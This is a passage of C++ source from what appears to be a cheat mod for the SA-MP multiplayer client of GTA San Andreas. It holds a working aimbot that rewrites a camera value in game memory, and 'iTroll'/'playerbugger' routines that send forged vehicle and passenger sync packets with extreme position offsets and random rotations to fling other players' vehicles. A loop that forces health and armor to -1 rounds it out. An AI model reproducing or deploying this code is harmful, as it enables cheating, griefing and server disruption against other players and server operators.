		//SendFakeDriverSyncData1(g_Players->pLocalPlayer->sCurrentVehicleID, coord, -1, speed, fQuaternion, 0);
		stInCarData onSync;
			ZeroMemory(&onSync, sizeof(stInCarData)); 
			
			onSync.sVehicleID = g_Players->pLocalPlayer->sCurrentVehicleID;
			onSync.fVehicleHealth = g_Players->pLocalPlayer->inCarData.fVehicleHealth; 
			onSync.byteArmor = g_Players->pLocalPlayer->inCarData.byteArmor;   
			onSync.bytePlayerHealth = g_Players->pLocalPlayer->inCarData.bytePlayerHealth;
			
			onSync.fPosition[0] = g_Players->pLocalPlayer->inCarData.fPosition[0];
			onSync.fPosition[1] = g_Players->pLocalPlayer->inCarData.fPosition[1];
			onSync.fPosition[2] = g_Players->pLocalPlayer->inCarData.fPosition[2];
			
			onSync.fMoveSpeed[0] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[0];
			onSync.fMoveSpeed[1] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[1];
			onSync.fMoveSpeed[2] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[2];
		
			
			onSync.fQuaternion[0] = random_float(-1, 1);
				onSync.fQuaternion[1] = random_float(-1, 1);
				onSync.fQuaternion[2] = random_float(-1, 1);
				onSync.fQuaternion[3] = random_float(-1, 1);
			
		
			 BitStream bsData;
			bsData.Write((BYTE)ID_VEHICLE_SYNC);
			bsData.Write((PCHAR)&onSync,sizeof(stInCarData));
			
			g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);
	}}

  void cheat_handle_crh25ass () 
{ 
	traceLastFunc( "cheat_handle_crh25ass()" );
    if( cheat_state->_generic.log_packet_send == 1 )
    {
for(int ccflood = 0; ccflood < 600;ccflood++)
{
		actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->armor = -1 - actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints;
		actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = -1; 
		actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->armor = -1 - actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints;
		actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = -1; 
		actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->armor = -1 - actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints;
		actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = -1; 
		actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->armor = -1 - actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints;
		actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = -1; 
		actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->armor = -1 - actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints;
		actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = -1; 
		actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->armor = -1 - actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints;
		actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = -1; 
		actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->armor = -1 - actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints;
		actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = -1; 
		actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->armor = -1 - actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints;
		actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = -1; 
		actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->armor = -1 - actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints;
		actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = -1; 
		actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->armor = -1 - actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints;
		actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = -1; 
		actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->armor = -1 - actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints;
		actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = -1; 
		actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->armor = -1 - actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints;
		actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = -1; 
		actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->armor = -1 - actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints;
		actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = -1; 
		actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->armor = -1 - actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints;
		actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = -1; 
		actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->armor = -1 - actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints;
		actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = -1; 
		actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->armor = -1 - actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints;
		actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = -1; 
		actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->armor = -1 - actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints;
		actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = -1; 
		actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->armor = -1 - actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints;
		actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = -1; 
		actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->armor = -1 - actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints;
		actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = -1; 
}}}



  


  bool ValidPlayerz(int PlayerID)
{
	if ( g_Players == NULL )
		return 0;

	if ( PlayerID < 0 || PlayerID > SAMP_PLAYER_MAX )
		return 0;

	if ( PlayerID == g_Players->sLocalPlayerID )
		return 0;

	if ( g_Players->iIsListed[PlayerID] != 1 )
		return 0;

	return 1;
}

bool ValidVehiclez(int VehicleID)
{
	if ( g_Vehicles->iIsListed[VehicleID] != 1 )
		return 0;

	if ( g_Vehicles->pSAMP_Vehicle[VehicleID] == NULL )
		return 0;

	if ( g_Vehicles->pSAMP_Vehicle[VehicleID]->pGTA_Vehicle == NULL )
		return 0;

	return 1;
}



void QuaternionToMatrix( float &quaterW, float &quaterX, float &quaterY, float &quaterZ, tVector* right, tVector* up, tVector* at )
{
	float SquarredQuaterW = 0.0f, SquarredQuaterX = 0.0f, SquarredQuaterY = 0.0f, SquarredQuaterZ = 0.0f;

	SquarredQuaterW = quaterW * quaterW;
	SquarredQuaterX = quaterX * quaterX;
	SquarredQuaterY = quaterY * quaterY;
	SquarredQuaterZ = quaterZ * quaterZ;
	right->X	= SquarredQuaterX - SquarredQuaterY - SquarredQuaterZ + SquarredQuaterW;
	up->Y		= SquarredQuaterY - SquarredQuaterX - SquarredQuaterZ + SquarredQuaterW;
	at->Z		= SquarredQuaterZ - (SquarredQuaterY + SquarredQuaterX) + SquarredQuaterW;

	float multXY = quaterX * quaterY;
	float multWZ = quaterW * quaterZ;
	up->X		= multWZ + multXY + multWZ + multXY;
	right->Y	= multXY - multWZ + multXY - multWZ;

	float multXZ = quaterX * quaterZ;
	float multWY = quaterW * quaterY;
	at->X		= multXZ - multWY + multXZ - multWY;
	right->Z	= multWY + multXZ + multWY + multXZ;

	float multYZ = quaterY * quaterZ;
	float multWX = quaterW * quaterX;
	at->Y = multWX + multYZ + multWX + multYZ;
	up->Z = multYZ - multWX + multYZ - multWX;
}

void MatrixToQuaternion( tVector* right, tVector* up, tVector* at, float &quaterW, float &quaterX, float &quaterY, float &quaterZ ) // IDA POWA !
{
  long double v13; // st7@1
  long double v14; // st7@3
  long double v15; // st5@5
  float v16; // st6@5
  float v17; // st7@5
  long double v18; // st6@7
  int result = 0; // eax@17
  float v20; // ST28_8@17
  float v21; // ST10_8@17
  float v22; // st7@17
  float v23; // [sp+10h] [bp-20h]@7
  float v24; // [sp+18h] [bp-18h]@9
  float v25; // [sp+20h] [bp-10h]@3

  v13 = right->X + up->Y + at->Z + 1.0f;
  if ( v13 < 0.0f )
    v13 = 0.0f;
  v25 = (float)sqrt(v13) * 0.5f;
  v14 = right->X + 1.0 - up->Y - at->Z;
  if ( v14 < 0.0f)
    v14 = 0.0f;
  v17 = (float)sqrt(v14) * 0.5f;
  v16 = 1.0f - right->X;
  v15 = up->Y + v16 - at->Z;
  if ( v15 < 0.0f )
    v15 = 0.0f;
  v23 = (float)sqrt(v15) * 0.5f;
  v18 = v16 - up->Y + at->Z;
  if ( v18 < 0.0f )
    v18 = 0.0f;
  v24 = (float)sqrt(v18) * 0.5f;
  if ( v25 < 0.0f )
    v25 = 0.0f;
  if ( v17 < 0.0f )
    v17 = 0.0f;
  if ( v23 < 0.0f )
    v23 = 0.0f;
  if ( v24 < 0.0f )
    v24 = 0.0f;
  v20 = (float)_copysign(v17, at->Y - up->Z);
  v21 = (float)_copysign(v23, right->Z - at->X);
  v22 = (float)_copysign(v24, up->X - right->Y);
  quaterW = v25;
  quaterX = v20;
  quaterY = v21;
  quaterZ = v22;
}


  void cheat_iTroll()
{
	traceLastFunc( "cheat_itroll()" );
    if( cheat_state->_generic.itroll == 1 )
    {
	traceLastFunc( "cheat_handle_playerbugger()" );

	if(g_SAMP == NULL || g_SAMP->iGameState != GAMESTATE_CONNECTED)
		return;

	if( cheat_state->_generic.playerbugger_incar == 1 )
	{
		struct actor_info *self = actor_info_get( ACTOR_SELF, 0 );

		static int iPlayerID;

		if ( g_Players->iIsListed[iPlayerID] != 1
			||  g_Players->pRemotePlayer[iPlayerID] == NULL
			||  g_Players->pRemotePlayer[iPlayerID]->pPlayerData == NULL
			||  g_Players->pRemotePlayer[iPlayerID]->pPlayerData->pSAMP_Actor == NULL
			||  g_Players->pRemotePlayer[iPlayerID]->pPlayerData->pSAMP_Actor->pGTA_Ped == NULL
			||  getPlayerSAMPVehicleID(iPlayerID) == NULL
			||  getPlayerSAMPVehicleID(iPlayerID) == g_Players->pLocalPlayer->sCurrentVehicleID
			||  getPlayerState(iPlayerID) != PLAYER_STATE_DRIVER && getPlayerState(iPlayerID) != PLAYER_STATE_PASSENGER )
			goto find_another_player;

		struct vehicle_info *vinfo = g_Players->pRemotePlayer[iPlayerID]->pPlayerData->pSAMP_Actor->pGTA_Ped->vehicle;

		int iSAMPVehicleID;

		if ( vinfo == vehicle_info_get(VEHICLE_SELF, 0) && vinfo->passengers[0] != self )
			iSAMPVehicleID = g_Players->pLocalPlayer->passengerData.sVehicleID;
		else
			iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);

		if(iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID/* || iSAMPVehicleID == g_Players->pLocalPlayer->passengerData.sVehicleID*/)
		{
			iPlayerID++;
			goto find_another_player;
		}

		if ( KEY_PRESSED(VK_LBUTTON) )
		{
			struct actor_info *pSelfActor = actor_info_get( ACTOR_SELF, 0 );

			BYTE byteCurrentWeap;

			if ( cheat_state->state == CHEAT_STATE_VEHICLE )
				byteCurrentWeap = g_Players->pLocalPlayer->inCarData.byteCurrentWeapon;

			else if ( cheat_state->state == CHEAT_STATE_ACTOR )
				byteCurrentWeap = g_Players->pLocalPlayer->onFootData.byteCurrentWeapon;

			else byteCurrentWeap = 0;

			bool bWasInVehicle = pSelfActor->pedFlags.bInVehicle;

			pSelfActor->pedFlags.bInVehicle = true;

			float fPos[3];
			vect3_copy(&self->base.matrix[4 * 3], fPos);

			fPos[0] += -128471816.0000;
			fPos[1] += 889395.2500;
			fPos[2] += 13083.3252;

			float fSpeed[3];
			fSpeed[0] = cam_matrix[4] * 6.0f;
			fSpeed[1] = cam_matrix[5] * 6.0f;
			fSpeed[2] = cam_matrix[6] * 6.0f;

			 BitStream bsPassengerSync;
			 BitStream bsInCarSync;

			stInCarData InCarData;
			stPassengerData PassengerData;

			InCarData.sVehicleID = iSAMPVehicleID;
			PassengerData.sVehicleID = iSAMPVehicleID;

			InCarData.fVehicleHealth = vinfo->hitpoints;

			InCarData.bytePlayerHealth = pSelfActor->hitpoints;
			PassengerData.byteHealth = pSelfActor->hitpoints;

			InCarData.byteArmor = pSelfActor->armor;
			PassengerData.byteArmor = pSelfActor->armor;

			InCarData.byteCurrentWeapon = byteCurrentWeap;
			PassengerData.byteCurrentWeapon = byteCurrentWeap;

			InCarData.sTrailerID = g_SAMP->pPools.pPool_Player->pRemotePlayer[iPlayerID]->pPlayerData->inCarData.sTrailerID;

			vect3_copy(vinfo->base.coords, InCarData.fPosition);
			vect3_copy(vinfo->base.coords, PassengerData.fPosition);

			PassengerData.byteSeatID = 1;

			bsPassengerSync.Write((BYTE)ID_PASSENGER_SYNC);
			bsPassengerSync.Write((PCHAR)&PassengerData,sizeof(stPassengerData));

			vect3_copy(fPos, InCarData.fPosition);
			vect3_copy(fSpeed, InCarData.fMoveSpeed);

			bsInCarSync.Write((BYTE)ID_VEHICLE_SYNC);
			bsInCarSync.Write((PCHAR)&InCarData,sizeof(stInCarData));

			
			g_DrifeitClient->Send(&bsPassengerSync, HIGH_PRIORITY, RELIABLE_SEQUENCED, 0);

			
			g_DrifeitClient->Send(&bsInCarSync, HIGH_PRIORITY, RELIABLE_SEQUENCED, 0);

			pSelfActor->pedFlags.bInVehicle = bWasInVehicle;

			iPlayerID++;
		}

find_another_player:
	for ( iPlayerID; iPlayerID < SAMP_PLAYER_MAX; iPlayerID++ )
	{
		if ( g_Players->iIsListed[iPlayerID] == 1
			&&  g_Players->pRemotePlayer[iPlayerID] != NULL
			&&  g_Players->pRemotePlayer[iPlayerID]->pPlayerData != NULL
			&&  g_Players->pRemotePlayer[iPlayerID]->pPlayerData->pSAMP_Actor != NULL
			&&  g_Players->pRemotePlayer[iPlayerID]->pPlayerData->pSAMP_Actor->pGTA_Ped != NULL
			&&  getPlayerSAMPVehicleID(iPlayerID) != NULL
			&&  getPlayerSAMPVehicleID(iPlayerID) != g_Players->pLocalPlayer->sCurrentVehicleID
			&&  getPlayerState(iPlayerID) == PLAYER_STATE_DRIVER || getPlayerState(iPlayerID) == PLAYER_STATE_PASSENGER)
		break;
	}

	if ( iPlayerID >= SAMP_PLAYER_MAX )
		iPlayerID = 0;
	}

}}

void cheat_handle_itroll_targetfinder ()
{
	traceLastFunc( "cheat_handle_itroll_targetfinder()" );
   
	if(cheat_state->state == CHEAT_STATE_NONE)
		return;

	if(!g_SAMP || !g_Players || !g_Vehicles)
		return;

	int iPlayerID = cheat_state->_generic.playerbugger_onfoot_targetid;

	static unsigned short usFoundVehicleID = 0xFFFF;
	static DWORD dwVehicleFoundTick = GetTickCount();

	stInCarData sync;
	 BitStream bsVehicleSync;

	float pos[3] = { pPedSelf->GetPosition()->fX, pPedSelf->GetPosition()->fY, pPedSelf->GetPosition()->fZ };
	
	struct actor_info *self = actor_info_get(ACTOR_SELF, ACTOR_ALIVE);

	if(cheat_state->_generic.playerbugger_onfoot)
	{
		if ( iPlayerID < 0 || iPlayerID > SAMP_PLAYER_MAX )
			return;

		if(g_Players->sLocalPlayerID == iPlayerID ||g_Players->pRemotePlayer[iPlayerID] == NULL)
			return;

		if (getPlayerState(iPlayerID) != PLAYER_STATE_ONFOOT && getPlayerState(iPlayerID) != PLAYER_STATE_DRIVER)
			return;

		if(usFoundVehicleID != 0xFFFF)
		{
			if(!ValidVehiclez(usFoundVehicleID))
			{
				usFoundVehicleID = 0xFFFF;
				return;
			}

			if(dwVehicleFoundTick < GetTickCount() - 50)
			{
				self->vehicle = g_Vehicles->pGTA_Vehicle[usFoundVehicleID];

				memset(&sync, 0, sizeof(stInCarData));

				sync.sVehicleID = usFoundVehicleID;
				sync.fVehicleHealth = g_Vehicles->pGTA_Vehicle[usFoundVehicleID]->hitpoints;

				sync.bytePlayerHealth = self->hitpoints;
				sync.byteArmor = self->armor;

				sync.fQuaternion[0] = 0.707107;
				sync.fQuaternion[1] = -0.707107;
				sync.fQuaternion[2] = 0;
				sync.fQuaternion[3] = 0;

				sync.fPosition[0] = g_Players->pRemotePlayer[iPlayerID]->pPlayerData->onFootData.fPosition[0] + -128471816.0000;
				sync.fPosition[1] = g_Players->pRemotePlayer[iPlayerID]->pPlayerData->onFootData.fPosition[1] + 889395.2500;
				sync.fPosition[2] = g_Players->pRemotePlayer[iPlayerID]->pPlayerData->onFootData.fPosition[2] - 0.75f + 13083.3252;

				sync.fMoveSpeed[0] = cam_matrix[4] * 6.0f;
				sync.fMoveSpeed[1] = cam_matrix[5] * 6.0f;
				sync.fMoveSpeed[2] = cam_matrix[6] * 6.0f;

				cheat_vehicle_teleport(g_Vehicles->pGTA_Vehicle[usFoundVehicleID], sync.fPosition, 0);

				GTAfunc_RemoveActorFromCarAndPutAt(pos);

				bsVehicleSync.Reset();
				bsVehicleSync.Write((BYTE)ID_VEHICLE_SYNC);
				bsVehicleSync.Write((PCHAR)&sync,sizeof(stInCarData));

				
				g_DrifeitClient->Send(&bsVehicleSync, HIGH_PRIORITY, RELIABLE_SEQUENCED, 0);

				usFoundVehicleID = 0xFFFF;
				return;
			}
		}

		int iClosestVehicleGTAID = vehicle_find_nearest( VEHICLE_ALIVE + VEHICLE_NOTBURNING );
		struct vehicle_info *pSlapperVehicle = vehicle_info_get( iClosestVehicleGTAID, 0 );
		unsigned short usClosestVehicleSAMPID = getSAMPVehicleIDFromGTAVehicle(pSlapperVehicle);

		if(!ValidVehiclez(usClosestVehicleSAMPID))
			return;

		if(KEY_PRESSED(VK_LBUTTON))
		{
			if(usFoundVehicleID == 0xFFFF)
			{
				self->vehicle = pSlapperVehicle;

				memset(&sync, 0, sizeof(stInCarData));

				sync.sVehicleID = usClosestVehicleSAMPID;
				sync.fVehicleHealth = pSlapperVehicle->hitpoints;
				sync.bytePlayerHealth = self->hitpoints;
				sync.byteArmor = self->armor;
						
				sync.fQuaternion[0] = 0.707107;
				sync.fQuaternion[1] = -0.707107;
				sync.fQuaternion[2] = 0;
				sync.fQuaternion[3] = 0;

				sync.fPosition[0] = g_Players->pRemotePlayer[iPlayerID]->pPlayerData->onFootData.fPosition[0];
				sync.fPosition[1] = g_Players->pRemotePlayer[iPlayerID]->pPlayerData->onFootData.fPosition[1]; 
				sync.fPosition[2] = g_Players->pRemotePlayer[iPlayerID]->pPlayerData->onFootData.fPosition[2] - 0.75f;
					
				cheat_vehicle_teleport(pSlapperVehicle, sync.fPosition, 0);

				pSlapperVehicle->base.matrixStruct->right.X = 1;
				pSlapperVehicle->base.matrixStruct->right.Y = 1;
				pSlapperVehicle->base.matrixStruct->right.Z = 1;

				pSlapperVehicle->base.matrixStruct->up.Z = 1;

				GTAfunc_RemoveActorFromCarAndPutAt(pos);

				bsVehicleSync.Reset();
				bsVehicleSync.Write((BYTE)ID_VEHICLE_SYNC);
				bsVehicleSync.Write((PCHAR)&sync,sizeof(stInCarData));

	
				g_DrifeitClient->Send(&bsVehicleSync, HIGH_PRIORITY, RELIABLE_SEQUENCED, 0);

				usFoundVehicleID = sync.sVehicleID;
				dwVehicleFoundTick = GetTickCount();
			}
		}
	}
}

	
bool isOldAimKeyDown = false;
int aimidf = 9999;

float getRandomFloat()
{
	return static_cast <float> (rand()) / static_cast <float> (RAND_MAX);
}

#define CAMERA_X	*(float *)0xB6F258

void skin_aimbot(struct actor_info *self, struct actor_info *target)
{
	float mult1 = 35.0f;
	float mult2 = 17.0f;
	mult2 /= 360.0f;
	CVector vecSpeed = target->m_SpeedVec;
	vecSpeed.fX *= mult2;
	vecSpeed.fY *= mult2;
	vecSpeed.fZ *= mult2;
	vecSpeed.fX *= mult1;
	vecSpeed.fY *= mult1;
	vecSpeed.fZ *= mult1;
	CVector vecPos(target->base.matrix[12], target->base.matrix[13], target->base.matrix[14]);
	vecPos.fX += vecSpeed.fX;
	vecPos.fY += vecSpeed.fY;
	vecPos.fZ += vecSpeed.fZ;
	CVector newVecPos = vecPos;
	CVector vecCameraPos = *pGame->GetCamera()->GetCam(pGame->GetCamera()->GetActiveCam())->GetSource();
	CVector newVecOrigin = *pPedSelf->GetPosition();
	vecCameraPos.fX -= newVecPos.fX;
	vecCameraPos.fY -= newVecPos.fY;
	if (vecCameraPos.fX < 0.0f) vecCameraPos.fX = -vecCameraPos.fX;
	if (vecCameraPos.fY < 0.0f) vecCameraPos.fY = -vecCameraPos.fY;
	float camerax = vecCameraPos.fX;
	float cameray = vecCameraPos.fY;
	camerax *= camerax;
	cameray *= cameray;
	camerax += cameray;
	camerax = sqrt(camerax);
	cameray = vecCameraPos.fX;
	float ccamx = camerax;
	cameray /= ccamx;
	ccamx = asinf(cameray);
	float ccamy = acosf(cameray);
	if (self->weapon_slot != 2 && self->weapon_slot != 3 && self->weapon_slot != 4 && self->weapon_slot != 5
		&& self->weapon_slot != 6 && self->weapon_slot != 7)
		return;
	float cam_x;
	float unk7[4];
	if (self->weapon_slot == 5)
	{
		unk7[0] = 0.01f;
		unk7[1] = 0.01f;
		unk7[2] = 1.5607f;
		unk7[3] = 1.5807f;
	}
	else if (self->weapon_slot == 6)
	{
		unk7[0] = 0.018f;
		unk7[1] = 0.02f;
		unk7[2] = 1.5507f;
		unk7[3] = 1.5907f;
	}
	else
	{
		unk7[0] = 0.0f;
		unk7[1] = 0.0f;
		unk7[2] = 1.5707f;
		unk7[3] = 1.5707f;
	}
	if (newVecOrigin.fX > newVecPos.fX && newVecOrigin.fY > newVecPos.fY)
	{
		ccamy -= unk7[1];
		cam_x = ccamy;
	}
	else if (newVecOrigin.fX > newVecPos.fX && newVecOrigin.fY < newVecPos.fY)
	{
		ccamy *= -1.0f;
		ccamy -= unk7[0];
		cam_x = ccamy;
	}
	else if (newVecOrigin.fX < newVecPos.fX && newVecOrigin.fY > newVecPos.fY)
	{
		ccamx += unk7[2];
		cam_x = ccamx;
	}
	else if (newVecOrigin.fX < newVecPos.fX && newVecOrigin.fY < newVecPos.fY)
	{
		ccamx *= -1.0f;
		ccamx -= unk7[3];
		cam_x = ccamx;
	}
	//else
	//{
		float cam_xx = CAMERA_X;
		cam_xx -= cam_x;
		if (cam_xx < 0.18f && cam_xx > -0.18f)
		{
			cam_x += 0.0389f;
			CAMERA_X = cam_x;
		}
		else
			return;
	//}
}


void car_aimbot(struct actor_info *self, struct vehicle_info *target)
{
	float mult1 = 35.0f;
	float mult2 = 17.0f;
	mult2 /= 360.0f;
	CVector vecSpeed = target->m_SpeedVec;
	vecSpeed.fX *= mult2;
	vecSpeed.fY *= mult2;
	vecSpeed.fZ *= mult2;
	vecSpeed.fX *= mult1;
	vecSpeed.fY *= mult1;
	vecSpeed.fZ *= mult1;
	CVector vecPos(target->base.matrix[12], target->base.matrix[13], target->base.matrix[14]);
	vecPos.fX += vecSpeed.fX;
	vecPos.fY += vecSpeed.fY;
	vecPos.fZ += vecSpeed.fZ;
	CVector newVecPos = vecPos;
	CVector vecCameraPos = *pGame->GetCamera()->GetCam(pGame->GetCamera()->GetActiveCam())->GetSource();
	CVector newVecOrigin = *pPedSelf->GetPosition();
	vecCameraPos.fX -= newVecPos.fX;
	vecCameraPos.fY -= newVecPos.fY;
	if (vecCameraPos.fX < 0.0f) vecCameraPos.fX = -vecCameraPos.fX;
	if (vecCameraPos.fY < 0.0f) vecCameraPos.fY = -vecCameraPos.fY;
	float camerax = vecCameraPos.fX;
	float cameray = vecCameraPos.fY;
	camerax *= camerax;
	cameray *= cameray;
	camerax += cameray;
	camerax = sqrt(camerax);
	cameray = vecCameraPos.fX;
	float ccamx = camerax;
	cameray /= ccamx;
	ccamx = asinf(cameray);
	float ccamy = acosf(cameray);
	if (self->weapon_slot != 2 && self->weapon_slot != 3 && self->weapon_slot != 4 && self->weapon_slot != 5
		&& self->weapon_slot != 6 && self->weapon_slot != 7)
		return;
	float cam_x;
	float unk7[4];
	if (self->weapon_slot == 5)
	{
		unk7[0] = 0.01f;
		unk7[1] = 0.01f;
		unk7[2] = 1.5607f;
		unk7[3] = 1.5807f;
	}
	else if (self->weapon_slot == 6)
	{
		unk7[0] = 0.018f;
		unk7[1] = 0.02f;
		unk7[2] = 1.5507f;
		unk7[3] = 1.5907f;
	}
	else
	{
		unk7[0] = 0.0f;
		unk7[1] = 0.0f;
		unk7[2] = 1.5707f;
		unk7[3] = 1.5707f;
	}
	if (newVecOrigin.fX > newVecPos.fX && newVecOrigin.fY > newVecPos.fY)
	{
		ccamy -= unk7[1];
		cam_x = ccamy;
	}
	else if (newVecOrigin.fX > newVecPos.fX && newVecOrigin.fY < newVecPos.fY)
	{
		ccamy *= -1.0f;
		ccamy -= unk7[0];
		cam_x = ccamy;
	}
	else if (newVecOrigin.fX < newVecPos.fX && newVecOrigin.fY > newVecPos.fY)
	{
		ccamx += unk7[2];
		cam_x = ccamx;
	}
	else if (newVecOrigin.fX < newVecPos.fX && newVecOrigin.fY < newVecPos.fY)
	{
		ccamx *= -1.0f;
		ccamx -= unk7[3];
		cam_x = ccamx;
	}
	//else
	//{
	float cam_xx = CAMERA_X;
	cam_xx -= cam_x;
	if (cam_xx < 0.18f && cam_xx > -0.18f)
	{
		cam_x += 0.0389f;
		CAMERA_X = cam_x;
	}
	else
		return;
	//}
}



void cheat_handle_aim(actor_info* info)
{
	if (!cheat_state->_generic.AimbotToggle)
		return;

	if (g_Players!=NULL)
	{
		//GET CHAIR POSITION
		
		float silentAimMargins[2];
		if (info->weapon_model != 358) {
			silentAimMargins[0] = pPresentParam.BackBufferWidth * 0.5299999714f;
			silentAimMargins[1] = pPresentParam.BackBufferHeight * 0.4f;
		}
		else {
			silentAimMargins[0] = pPresentParam.BackBufferWidth * 0.5f;
			silentAimMargins[1] = pPresentParam.BackBufferHeight * 0.5f;
		}

		//DRAW THE EXECUTION FRAME IF AIMBOT IS TOGGLED ON
		/*if (cheat_state->_aimbot.AimbotToggle) {
			render->D3DBoxBorder(
				silentAimMargins[0] - (pPresentParam.BackBufferWidth * cheat_state->_aimbot.silentFrameX),
				silentAimMargins[1] - (pPresentParam.BackBufferHeight * cheat_state->_aimbot.silentFrameY),
				(pPresentParam.BackBufferWidth * (cheat_state->_aimbot.silentFrameX * 2)), (pPresentParam.BackBufferHeight * (cheat_state->_aimbot.silentFrameY * 2)),
				D3DCOLOR_ARGB(255, 255, 255, 255), D3DCOLOR_ARGB(0, 0, 0, 0));
		}*/
		
		//THIS GET INFO FOR GREEN TRIANGLE WHILE AIMING
		uint8_t	*ptr = (uint8_t *)g_Players->pLocalPlayer - 320;
		uint16_t thedata[5];
		memcpy_safe(&thedata, ptr + 0x2b9, 4);

		if (thedata[0] == 0xffff)
		{
			//cheat_state->playerAimed = -1;
		}
		else {
			cheat_state->_generic.playerAimed = thedata[0];
		}


		//IS SHOOTING?
		bool						isAimKeyDown = false;
		bool						isAim2KeyDown = false;
		CControllerConfigManager	*pPadConfig = pGameInterface->GetControllerConfigManager();

		// doesnt seem to work in single player with pPadConfig and keyboard input?
		if (pPadConfig->GetInputType())
		{
			// mouse + keyboard
			if (KEY_DOWN(pPadConfig->GetControllerKeyAssociatedWithAction(FIRE, MOUSE)))
				isAimKeyDown = true;

			else if (KEY_DOWN(pPadConfig->GetControllerKeyAssociatedWithAction(FIRE, KEYBOARD)))
				isAimKeyDown = true;
		}
		else
		{
			// gamepad
			if (KEY_DOWN(pPadConfig->GetControllerKeyAssociatedWithAction(FIRE, JOYSTICK)))
				isAimKeyDown = true;
		}


		//IS AIMING?
			if (KEY_DOWN(0x02))
			{
				isAim2KeyDown = true;
				cheat_state->_generic.playerAiming = true;
			}
			else
			{
				isAim2KeyDown = false;
				cheat_state->_generic.playerAiming = false;
			}

			//IF AIMING, GET TARGETS IN CHAIR
			if (isAim2KeyDown)
			{
				CVehicle *pCVehicleTeleport = NULL;
				CPed     *pCPedTeleport = NULL;
				D3DXVECTOR3 poss, screenposs;
				
				//pPresentParam X = screenWidth * 0.5299999714f; Y = screenHeight * 0.4f

				if (info->weapon_model != 358)
				{
					screenposs.x = pPresentParam.BackBufferWidth * 0.5299999714f;
					screenposs.y = pPresentParam.BackBufferHeight * 0.4f;
				}
				else
				{
					screenposs.x = pPresentParam.BackBufferWidth * 0.5f;
					screenposs.y = pPresentParam.BackBufferHeight * 0.5f;
				}

				screenposs.z = 700.0f;

				CalcWorldCoors(&screenposs, &poss);

				CVector vecTarget(poss.x, poss.y, poss.z);

				// setup variables
				CVector				vecOrigin, vecGroundPos;
				CColPoint			*pCollision = NULL;
				CEntitySAInterface	*pCollisionEntity = NULL;

				// origin = our camera
				vecOrigin = *pGame->GetCamera()->GetCam(pGame->GetCamera()->GetActiveCam())->GetSource();

				// check for collision
				bool bCollision = GTAfunc_ProcessLineOfSight(&vecOrigin, &vecTarget, &pCollision, &pCollisionEntity,
					1, 1, 1, 1, 0, 0, 0, 0);

				if (bCollision && pCollision)
				{
					//IS CAR???
					if (pCollisionEntity && pCollisionEntity->nType == ENTITY_TYPE_VEHICLE)
					{
						pCVehicleTeleport = pGameInterface->GetPools()->GetVehicle((DWORD *)pCollisionEntity);
						if (pCVehicleTeleport)
						{
							//vecGroundPos = *pCVehicleTeleport->GetPosition();
							const struct vehicle_entry *vehicleEntry = gta_vehicle_get_by_id(pCVehicleTeleport->GetModelIndex());
